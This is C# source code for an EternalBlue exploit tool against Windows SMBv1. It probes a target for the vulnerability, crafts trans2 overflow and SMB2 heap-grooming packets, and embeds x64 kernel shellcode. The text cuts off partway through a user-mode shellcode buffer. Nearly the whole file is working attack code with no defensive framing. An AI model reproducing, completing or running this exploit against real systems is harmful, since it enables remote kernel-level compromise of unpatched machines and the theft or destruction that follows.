using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;

namespace Eternalblue
{
    class Program
    {

        public struct SMBHeader
        {
            public byte[] server_component;
            public byte smb_command;
            public byte error_class;
            public byte reserved1;
            public byte[] error_code;
            public byte flags;
            public byte[] flags2;
            public byte[] process_id_high;
            public byte[] signature;
            public byte[] reserved2;
            public byte[] tree_id;
            public byte[] process_id;
            public byte[] user_id;
            public byte[] multiplex_id;
        }

        public static SMBHeader Parsed_SMBHeader(byte[] unparsed)
        {
            SMBHeader header = new SMBHeader();
            header.server_component = unparsed.Take(4).ToArray();
            header.smb_command = unparsed[4];
            header.error_class = unparsed[5];
            header.reserved1 = unparsed[6];
            header.error_code = new byte[] { unparsed[6], unparsed[7] };
            header.flags = unparsed[9];
            header.flags2 = new byte[] { unparsed[10], unparsed[11] };
            header.process_id_high = new byte[] { unparsed[12], unparsed[13] };
            header.signature = new byte[] { unparsed[13], unparsed[14], unparsed[15], unparsed[16], unparsed[17], unparsed[18], unparsed[19], unparsed[20], unparsed[21] };
            header.reserved2 = new byte[] { unparsed[22], unparsed[23] };
            header.tree_id = new byte[] { unparsed[24], unparsed[25] };
            header.process_id = new byte[] { unparsed[26], unparsed[27] };
            header.user_id = new byte[] { unparsed[28], unparsed[29] };
            header.multiplex_id = new byte[] { unparsed[30], unparsed[31] };

            return header;
        }


        static public byte[] SMB1_Get_Response(Socket sock)
        {
            byte[] tcp_response = new byte[1024];
            try
            {
                sock.Receive(tcp_response);
            } catch (Exception e)
            {
                Console.WriteLine("Socket Error, exploit may fail: " + e);
            }       
            return tcp_response.Skip(4).ToArray(); 
        }

        static public void Detect_Version(byte[] res)
        {
            string hexValues = BitConverter.ToString(res).Replace("-", " ");
            string[] hexValuesSplit = hexValues.Split(' ');
            StringBuilder stringbuilder = new StringBuilder();
            foreach (string hex in hexValuesSplit)
            {
                int value = Convert.ToInt32(hex, 16);
                string stringValue = Char.ConvertFromUtf32(value);
                char charValue = (char)value;
                if (Char.IsLetterOrDigit(charValue))
                {
                    stringbuilder.Append(charValue);
                }
            }
            string s = "";
            char prev = 'W';
            foreach (char c in stringbuilder.ToString().Substring(stringbuilder.ToString().IndexOf("Windows")))
            {
                if (Char.IsDigit(c))
                {
                    if (Char.IsDigit(prev))
                    {
                        s += c;
                    }
                    else
                    {
                        s += " " + c;
                    }
                }
                else if (Char.IsLetter(c))
                {
                    if (Char.IsDigit(prev))
                    {
                        s += " " + c;
                    }
                    else
                    {
                        s += c;
                    }
                }
                prev = c;
            }
            Console.WriteLine("Windows Version Detected: " + s);
        }

        static public bool Check_Vulnerability(Socket sock)
        {
            bool vulnerable = false;
            byte[] pkt = { 0x00, 0x00, 0x00, 0x00, 0xff, 0x53, 0x4d, 0x42, 0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0, 0x08, 0x04, 0x56, 0x00, 0x08, 0x24, 0x86, 0x10, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x4a, 0x00, 0x02, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x5c, 0x50, 0x49, 0x50, 0x45, 0x5c, 0x00 };
            int len = pkt.Length - 4;
            byte[] hexlen = BitConverter.GetBytes(len);
            pkt[1] = hexlen[2];
            pkt[2] = hexlen[1];
            pkt[3] = hexlen[0];
            sock.Send(pkt);

            byte[] response = SMB1_Get_Response(sock);
            byte[] pattern = { 0x05, 0x02, 0x00, 0xc0 };
            string haystack = BitConverter.ToString(response);
            string needle = BitConverter.ToString(pattern);

            if (haystack.Contains(needle))
            {
                vulnerable = true;
            }

            return vulnerable;
        }

        static public byte[] Client_Negotiate(Socket sock)
        {
            byte[] pkt = new byte[] { 0x00, 0x00, 0x00, 0x54, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B, 0x00, 0x00, 0xC5, 0x5E, 0x00, 0x31, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00 };
            sock.Send(pkt);
            return SMB1_Get_Response(sock);
        }

        static public byte[] smb1_anonymous_login(Socket sock)
        {
            byte[] pkt = make_smb1_anonymous_login_packet();
            sock.Send(pkt);
            return SMB1_Get_Response(sock);
        }

        static public byte[] make_smb1_anonymous_login_packet()
        {
            byte[] pkt = { 0x00, 0x00, 0x00, 0x88, 0xff, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0d, 0xff, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00 };
            return pkt;
        }


        static public byte[] tree_connect_andx(string ip, Socket sock, byte[] user_id)
        {
            byte[] pkt = tree_connect_andx_request(ip, user_id);
            sock.Send(pkt);

            return SMB1_Get_Response(sock);
        }

        static public byte[] tree_connect_andx_request(string ip, byte[] user_id)
        {
            string ipc = @"\\" + ip + @"\IPC$";

            byte[] pkt = new byte[] { 0x00, 0x00, 0x00, 0x47, 0xff, 0x53, 0x4d, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x4b, user_id[0], user_id[1], 0xc5, 0x5e, 0x04, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x1a, 0x00, 0x00 };
            byte[] ipc_byte = Encoding.ASCII.GetBytes(ipc);
            byte[] rest = new byte[] { 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00 };

            //merge
            pkt = pkt.Concat(ipc_byte).ToArray();
            pkt = pkt.Concat(rest).ToArray();

            int len = pkt.Length - 4;
            byte[] hexlen = BitConverter.GetBytes(len);
            pkt[1] = hexlen[2];
            pkt[2] = hexlen[1];
            pkt[3] = hexlen[0];

            return pkt;
        }

        static public byte[] make_smb1_nt_trans_packet(byte[] tree_id, byte[] user_id)
        {
            byte[] pkt = { 0x00, 0x00, 0x04, 0x38, 0xff, 0x53, 0x4D, 0x42,0xa0, 0x00, 0x00, 0x00, 0x00 ,0x18, 0x07, 0xc0 , 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 ,0x00,0x00, tree_id[0], tree_id[1], 0xff,0xfe,user_id[0],user_id[1], 0x40, 0x00, 0x14,0x01,0x00,0x00, 0x1e, 0x00, 0x00, 0x00 , 0xd0, 0x03, 0x01, 0x00 , 0x1e, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x1e, 0x00, 0x00, 0x00 , 0x4b, 0x00, 0x00, 0x00 , 0xd0, 0x03, 0x00, 0x00 , 0x68, 0x00, 0x00, 0x00 , 0x01 , 0x00, 0x00 , 0x00, 0x00 , 0xec, 0x03};
            byte[] NT_Parameters = Enumerable.Repeat((byte)0x00, 31).ToArray();
            byte[] single = { 0x01 };
            byte[] undocumented = Enumerable.Repeat((byte)0x00, 973).ToArray();
            pkt = pkt.Concat(NT_Parameters).ToArray();
            pkt = pkt.Concat(single).ToArray();
            pkt = pkt.Concat(undocumented).ToArray();

            return pkt;
        }

        static public List<byte> helper(List<byte> arr, byte b, int times)
        {
            for (int i = 0; i < times; i++)
            {
                arr.Add(b);
            }
            return arr;
        }

        static public byte[] make_smb1_trans2_exploit_packet(byte[] tree_id, byte[] user_id, string type, int time)
        {
            int timeout = (time * 16) + 3;
            byte[] pkt = { 0x00, 0x00, 0x10, 0x35, 0xff, 0x53, 0x4D, 0x42, 0x33, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, tree_id[0], tree_id[1], 0xff, 0xfe, user_id[0], user_id[1], 0x40, 0x00, 0x09, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x35, 0x00, 0xd0, BitConverter.GetBytes(timeout)[0], 0x00, 0x00, 0x00, 0x10 };
            if (type.Equals("eb_trans2_exploit"))
            {
                List<byte> nt_trans_ex = new List<byte>();
                
                nt_trans_ex = helper(nt_trans_ex, 0x41, 2957); //Overflow
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x80,0x00,0xa8,0x00
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 16); //0x10
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0xff,0xff
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 6); //0x6
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0xff,0xff
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 22); //0x16
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x00,0xf1,0xdf,0xff // x86 addresses
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 8); //0x8
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0xff,0xff,0xff,0xff,0x60,0x00,0x04,0x10
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 4); //4
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x80,0xef,0xdf,0xff
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 4); //4
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x18,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 16); //0x10
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x60,0x00,0x04,0x10
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 12); //0xc
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 8); //0x8
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x80,0x10
                });
                nt_trans_ex = helper(nt_trans_ex, 0x00, 14); //0xe
                nt_trans_ex.AddRange(new List<byte>()
                {
                     0x39,0xbb
                });
                nt_trans_ex = helper(nt_trans_ex, 0x41, 965); //Overflow continues
                pkt = pkt.Concat(nt_trans_ex.ToArray()).ToArray(); //Collect it all
                return pkt;
            }

            if (type.Equals("eb_trans2_zero"))
            {
                List<byte> nt_trans_ex = new List<byte>();
                nt_trans_ex = helper(nt_trans_ex, 0x00, 2055);
                nt_trans_ex.Add(0x83);
                nt_trans_ex.Add(0xf3);
                nt_trans_ex = helper(nt_trans_ex, 0x41, 2039);
                pkt = pkt.Concat(nt_trans_ex.ToArray()).ToArray(); //Collect it all
                return pkt;
            } else
            {
                List<byte> nt_trans_ex = new List<byte>();
                nt_trans_ex = helper(nt_trans_ex, 0x41, 4096);
                pkt = pkt.Concat(nt_trans_ex.ToArray()).ToArray(); //Collect it all
            }

            return pkt;
        }

        static public byte[] make_smb1_echo_packet(byte[] tree_id, byte[] user_id)
        {
            byte[] pkt = { 0x00, 0x00, 0x00, 0x31, 0xff, 0x53, 0x4D, 0x42, 0x2b, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, tree_id[0], tree_id[1], 0xff, 0xfe, user_id[0], user_id[1], 0x40, 0x00, 0x01, 0x01, 0x00, 0x0c, 0x00, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00 };
            
            return pkt;
        }

        static public byte[] smb1_large_buffer(SMBHeader header, Socket sock)
        {
            //Send NT Trans
            byte[] nt_trans_pkt = make_smb1_nt_trans_packet(header.tree_id, header.user_id);
            
            sock.Send(nt_trans_pkt);
            //Parse result
            byte[] response = SMB1_Get_Response(sock);
            SMBHeader nt_trans_response = Parsed_SMBHeader(response);

            //initial trans2 request
            byte[] trans_pkt_nulled = make_smb1_trans2_exploit_packet(header.tree_id, header.user_id, "eb_trans2_zero", 0);

            //Send all but the last packet
            for (int i=1; i <= 14; i++)
            {
                byte[] temp = make_smb1_trans2_exploit_packet(header.tree_id, header.user_id, "eb_trans2_buffer", i);
                trans_pkt_nulled = trans_pkt_nulled.Concat(temp).ToArray();
            }
            byte[] echo = make_smb1_echo_packet(header.tree_id, header.user_id);
            
            trans_pkt_nulled = trans_pkt_nulled.Concat(echo).ToArray();
            sock.Send(trans_pkt_nulled);
            return SMB1_Get_Response(sock);
        }

        static public byte[] make_smb1_free_hole_session_packet(byte[] flags2, byte[] vcnum, byte[] native_os)
        {
            byte[] pkt = { 0x00, 0x00, 0x00, 0x51, 0xff, 0x53, 0x4D, 0x42,0x73, 0x00, 0x00, 0x00, 0x00 , 0x18, flags2[0],flags2[1], 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00 , 0xff, 0xfe , 0x00, 0x00 , 0x40, 0x00 , 0x0c , 0xff , 0x00, 0x00, 0x00, 0x04, 0x11, 0x0a, 0x00, vcnum[0],vcnum[1], 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00, 0x00, 0x80 ,0x16,0x00,native_os[0],native_os[1],native_os[2],native_os[3],native_os[4]};
            byte[] rest = Enumerable.Repeat((byte)0x00, 17).ToArray();
            pkt = pkt.Concat(rest).ToArray();
            return pkt;
        }

        static public Socket smb1_free_hole(string ip, int port, bool start)
        {
            TcpClient client = new TcpClient(ip, port);
            Socket sock = client.Client;
            Client_Negotiate(sock);
            byte[] pkt;
            if (start)
            {
                byte[] flags2 = {0x07,0xc0} ;
                byte[] vcnum = { 0x2d, 0x01 };
                byte[] native_os = { 0xf0, 0xff, 0x00, 0x00, 0x00 };
                pkt = make_smb1_free_hole_session_packet(flags2, vcnum,native_os);
            } 
            else
            {
                byte[] flags2 = { 0x07, 0x40 };
                byte[] vcnum = { 0x2c, 0x01 };
                byte[] native_os = { 0xf8, 0x87, 0x00, 0x00, 0x00 };
                pkt = make_smb1_free_hole_session_packet(flags2, vcnum, native_os);
            }

            sock.Send(pkt);
            SMB1_Get_Response(sock);
            return sock;
        }

        static public List<Socket> smb2_grooms(String ip, int port, int grooms, byte[] payload_hdr_pkt, List<Socket> groom_socks)
        {

            for (int i = 0; i < grooms; i++)
            {
                TcpClient client = new TcpClient(ip, port);
                Socket gsock = client.Client;
                groom_socks.Add(gsock);
                gsock.Send(payload_hdr_pkt);
            }

            return groom_socks;
        }

        static public byte[] make_smb2_payload_headers_packet()
        {
            byte[] pkt = { 0x00, 0x00, 0xff, 0xf7, 0xfe, 0x53, 0x4D, 0x42 };
            byte[] tmp = Enumerable.Repeat((byte)0x00, 124).ToArray();
            pkt = pkt.Concat(tmp).ToArray();
            return pkt;
        }

        static public byte[] make_smb2_payload_body_packet(byte[] kernel_user_payload)
        {
            int pkt_max_len = 4204;
            int pkt_setup_len = 497;
            int pkt_max_payload = pkt_max_len - pkt_setup_len;

            List<byte> pkt = new List<byte>();

            pkt.AddRange(new List<byte>()
            {
                 0x00, 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00, 0x03, 0x00, 0x00, 0x00
            });
            pkt = helper(pkt, 0x00, 28); //0x1c
            pkt.AddRange(new List<byte>()
            {
                 0x03,0x00,0x00,0x00
            });
            pkt = helper(pkt, 0x00, 116); //0x74
            //KI_USER_SHARED_DATA addresses
            pkt.AddRange(new List<byte>()
            { //64
                 0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff
            });
            pkt = helper(pkt, 0x00, 16); //0x10
            pkt.AddRange(new List<byte>()
            { //86
                0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff
            });
            pkt = helper(pkt, 0x00, 196); //0xc4 

            //payload address
            pkt.AddRange(new List<byte>()
            { 
               0x90,0xf1,0xdf,0xff
            });
            pkt = helper(pkt, 0x00, 4); //0x4 
            pkt.AddRange(new List<byte>()
            {
               0xf0,0xf1,0xdf,0xff
            });
            pkt = helper(pkt, 0x00, 64); //0x40
            pkt.AddRange(new List<byte>()
            {
               0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff
            });
            pkt = helper(pkt, 0x00, 8); //0x8
            pkt.AddRange(new List<byte>()
            {
               0x00,0x02,0xd0,0xff,0xff,0xff,0xff,0xff,0x00
            });
            pkt = pkt.Concat(kernel_user_payload).ToList();

            int j = pkt_max_payload - kernel_user_payload.Length;
            pkt.Add(0x00);
            /*
            for (int i = 0; i < j; i++)
            {
                pkt.Add(0x00);
            }
            */

            return pkt.ToArray();
        }

        static public byte[] make_kernel_shellcode()
        {
            byte[] shellcode = {0xB9,0x82,0x00,0x00,0xC0,0x0F,0x32,0x48,0xBB,0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,
0xFF,0x89,0x53,0x04,0x89,0x03,0x48,0x8D,0x05,0x0A,0x00,0x00,0x00,0x48,0x89,0xC2,
0x48,0xC1,0xEA,0x20,0x0F,0x30,0xC3,0x0F,0x01,0xF8,0x65,0x48,0x89,0x24,0x25,0x10,
0x00,0x00,0x00,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x50,0x53,0x51,0x52,
0x56,0x57,0x55,0x41,0x50,0x41,0x51,0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,
0x56,0x41,0x57,0x6A,0x2B,0x65,0xFF,0x34,0x25,0x10,0x00,0x00,0x00,0x41,0x53,0x6A,
0x33,0x51,0x4C,0x89,0xD1,0x48,0x83,0xEC,0x08,0x55,0x48,0x81,0xEC,0x58,0x01,0x00,
0x00,0x48,0x8D,0xAC,0x24,0x80,0x00,0x00,0x00,0x48,0x89,0x9D,0xC0,0x00,0x00,0x00,
0x48,0x89,0xBD,0xC8,0x00,0x00,0x00,0x48,0x89,0xB5,0xD0,0x00,0x00,0x00,0x48,0xA1,
0xF8,0x0F,0xD0,0xFF,0xFF,0xFF,0xFF,0xFF,0x48,0x89,0xC2,0x48,0xC1,0xEA,0x20,0x48,
0x31,0xDB,0xFF,0xCB,0x48,0x21,0xD8,0xB9,0x82,0x00,0x00,0xC0,0x0F,0x30,0xFB,0xE8,
0x38,0x00,0x00,0x00,0xFA,0x65,0x48,0x8B,0x24,0x25,0xA8,0x01,0x00,0x00,0x48,0x83,
0xEC,0x78,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x41,0x5B,0x41,0x5A,0x41,0x59,
0x41,0x58,0x5D,0x5F,0x5E,0x5A,0x59,0x5B,0x58,0x65,0x48,0x8B,0x24,0x25,0x10,0x00,
0x00,0x00,0x0F,0x01,0xF8,0xFF,0x24,0x25,0xF8,0x0F,0xD0,0xFF,0x56,0x41,0x57,0x41,
0x56,0x41,0x55,0x41,0x54,0x53,0x55,0x48,0x89,0xE5,0x66,0x83,0xE4,0xF0,0x48,0x83,
0xEC,0x20,0x4C,0x8D,0x35,0xE3,0xFF,0xFF,0xFF,0x65,0x4C,0x8B,0x3C,0x25,0x38,0x00,
0x00,0x00,0x4D,0x8B,0x7F,0x04,0x49,0xC1,0xEF,0x0C,0x49,0xC1,0xE7,0x0C,0x49,0x81,
0xEF,0x00,0x10,0x00,0x00,0x49,0x8B,0x37,0x66,0x81,0xFE,0x4D,0x5A,0x75,0xEF,0x41,
0xBB,0x5C,0x72,0x11,0x62,0xE8,0x18,0x02,0x00,0x00,0x48,0x89,0xC6,0x48,0x81,0xC6,
0x08,0x03,0x00,0x00,0x41,0xBB,0x7A,0xBA,0xA3,0x30,0xE8,0x03,0x02,0x00,0x00,0x48,
0x89,0xF1,0x48,0x39,0xF0,0x77,0x11,0x48,0x8D,0x90,0x00,0x05,0x00,0x00,0x48,0x39,
0xF2,0x72,0x05,0x48,0x29,0xC6,0xEB,0x08,0x48,0x8B,0x36,0x48,0x39,0xCE,0x75,0xE2,
0x49,0x89,0xF4,0x31,0xDB,0x89,0xD9,0x83,0xC1,0x04,0x81,0xF9,0x00,0x00,0x01,0x00,
0x0F,0x8D,0x66,0x01,0x00,0x00,0x4C,0x89,0xF2,0x89,0xCB,0x41,0xBB,0x66,0x55,0xA2,
0x4B,0xE8,0xBC,0x01,0x00,0x00,0x85,0xC0,0x75,0xDB,0x49,0x8B,0x0E,0x41,0xBB,0xA3,
0x6F,0x72,0x2D,0xE8,0xAA,0x01,0x00,0x00,0x48,0x89,0xC6,0xE8,0x50,0x01,0x00,0x00,
0x41,0x81,0xF9,0xBF,0x77,0x1F,0xDD,0x75,0xBC,0x49,0x8B,0x1E,0x4D,0x8D,0x6E,0x10,
0x4C,0x89,0xEA,0x48,0x89,0xD9,0x41,0xBB,0xE5,0x24,0x11,0xDC,0xE8,0x81,0x01,0x00,
0x00,0x6A,0x40,0x68,0x00,0x10,0x00,0x00,0x4D,0x8D,0x4E,0x08,0x49,0xC7,0x01,0x00,
0x10,0x00,0x00,0x4D,0x31,0xC0,0x4C,0x89,0xF2,0x31,0xC9,0x48,0x89,0x0A,0x48,0xF7,
0xD1,0x41,0xBB,0x4B,0xCA,0x0A,0xEE,0x48,0x83,0xEC,0x20,0xE8,0x52,0x01,0x00,0x00,
0x85,0xC0,0x0F,0x85,0xC8,0x00,0x00,0x00,0x49,0x8B,0x3E,0x48,0x8D,0x35,0xE9,0x00,
0x00,0x00,0x31,0xC9,0x66,0x03,0x0D,0xD7,0x01,0x00,0x00,0x66,0x81,0xC1,0xF9,0x00,
0xF3,0xA4,0x48,0x89,0xDE,0x48,0x81,0xC6,0x08,0x03,0x00,0x00,0x48,0x89,0xF1,0x48,
0x8B,0x11,0x4C,0x29,0xE2,0x51,0x52,0x48,0x89,0xD1,0x48,0x83,0xEC,0x20,0x41,0xBB,
0x26,0x40,0x36,0x9D,0xE8,0x09,0x01,0x00,0x00,0x48,0x83,0xC4,0x20,0x5A,0x59,0x48,
0x85,0xC0,0x74,0x18,0x48,0x8B,0x80,0xC8,0x02,0x00,0x00,0x48,0x85,0xC0,0x74,0x0C,
0x48,0x83,0xC2,0x4C,0x8B,0x02,0x0F,0xBA,0xE0,0x05,0x72,0x05,0x48,0x8B,0x09,0xEB,
0xBE,0x48,0x83,0xEA,0x4C,0x49,0x89,0xD4,0x31,0xD2,0x80,0xC2,0x90,0x31,0xC9,0x41,
0xBB,0x26,0xAC,0x50,0x91,0xE8,0xC8,0x00,0x00,0x00,0x48,0x89,0xC1,0x4C,0x8D,0x89,
0x80,0x00,0x00,0x00,0x41,0xC6,0x01,0xC3,0x4C,0x89,0xE2,0x49,0x89,0xC4,0x4D,0x31,
0xC0,0x41,0x50,0x6A,0x01,0x49,0x8B,0x06,0x50,0x41,0x50,0x48,0x83,0xEC,0x20,0x41,
0xBB,0xAC,0xCE,0x55,0x4B,0xE8,0x98,0x00,0x00,0x00,0x31,0xD2,0x52,0x52,0x41,0x58,
0x41,0x59,0x4C,0x89,0xE1,0x41,0xBB,0x18,0x38,0x09,0x9E,0xE8,0x82,0x00,0x00,0x00,
0x4C,0x89,0xE9,0x41,0xBB,0x22,0xB7,0xB3,0x7D,0xE8,0x74,0x00,0x00,0x00,0x48,0x89,
0xD9,0x41,0xBB,0x0D,0xE2,0x4D,0x85,0xE8,0x66,0x00,0x00,0x00,0x48,0x89,0xEC,0x5D,
0x5B,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0x5E,0xC3,0xE9,0xB5,0x00,0x00,0x00,
0x4D,0x31,0xC9,0x31,0xC0,0xAC,0x41,0xC1,0xC9,0x0D,0x3C,0x61,0x7C,0x02,0x2C,0x20,
0x41,0x01,0xC1,0x38,0xE0,0x75,0xEC,0xC3,0x31,0xD2,0x65,0x48,0x8B,0x52,0x60,0x48,
0x8B,0x52,0x18,0x48,0x8B,0x52,0x20,0x48,0x8B,0x12,0x48,0x8B,0x72,0x50,0x48,0x0F,
0xB7,0x4A,0x4A,0x45,0x31,0xC9,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0x41,
0xC1,0xC9,0x0D,0x41,0x01,0xC1,0xE2,0xEE,0x45,0x39,0xD9,0x75,0xDA,0x4C,0x8B,0x7A,
0x20,0xC3,0x4C,0x89,0xF8,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x89,0xC2,0x8B,
0x42,0x3C,0x48,0x01,0xD0,0x8B,0x80,0x88,0x00,0x00,0x00,0x48,0x01,0xD0,0x50,0x8B,
0x48,0x18,0x44,0x8B,0x40,0x20,0x49,0x01,0xD0,0x48,0xFF,0xC9,0x41,0x8B,0x34,0x88,
0x48,0x01,0xD6,0xE8,0x78,0xFF,0xFF,0xFF,0x45,0x39,0xD9,0x75,0xEC,0x58,0x44,0x8B,
0x40,0x24,0x49,0x01,0xD0,0x66,0x41,0x8B,0x0C,0x48,0x44,0x8B,0x40,0x1C,0x49,0x01,
0xD0,0x41,0x8B,0x04,0x88,0x48,0x01,0xD0,0x5E,0x59,0x5A,0x41,0x58,0x41,0x59,0x41,
0x5B,0x41,0x53,0xFF,0xE0,0x56,0x41,0x57,0x55,0x48,0x89,0xE5,0x48,0x83,0xEC,0x20,
0x41,0xBB,0xDA,0x16,0xAF,0x92,0xE8,0x4D,0xFF,0xFF,0xFF,0x31,0xC9,0x51,0x51,0x51,
0x51,0x41,0x59,0x4C,0x8D,0x05,0x1A,0x00,0x00,0x00,0x5A,0x48,0x83,0xEC,0x20,0x41,
0xBB,0x46,0x45,0x1B,0x22,0xE8,0x68,0xFF,0xFF,0xFF,0x48,0x89,0xEC,0x5D,0x41,0x5F,
0x5E,0xC3};
            return shellcode;
        }

        static public byte[] make_kernel_user_payload(byte[] ring3)
        {
            byte[] shellcode = make_kernel_shellcode();
            byte[] length = BitConverter.GetBytes((UInt16)ring3.Length);
            shellcode = shellcode.Concat(length).ToArray();
            shellcode = shellcode.Concat(ring3).ToArray();
            System.Diagnostics.Debug.WriteLine(BitConverter.ToString(shellcode).Replace("-", ""));

            return shellcode;
        }


        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: Eternalblue.exe [ip] [grooms]");
                Environment.Exit(0);
            }
            bool vulnerable = false;
            string ip = args[0];
            int port = 445;
            int grooms = Convert.ToInt32(args[1]);
            //int MaxAttempts = args[2]; 

            TcpClient client = new TcpClient(ip, port);
            Socket sock = client.Client;
            

            byte[] response = Client_Negotiate(sock);
            response = smb1_anonymous_login(sock);
            Detect_Version(response);

            SMBHeader smbh = Parsed_SMBHeader(response);
            response = tree_connect_andx(ip, sock, smbh.user_id);

            //This is sent with userid 2049 and not 2048
            vulnerable = Check_Vulnerability(sock);
            sock.Close();
            client.Close();

            if (vulnerable)
            {
                byte[] buf = new byte[279] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
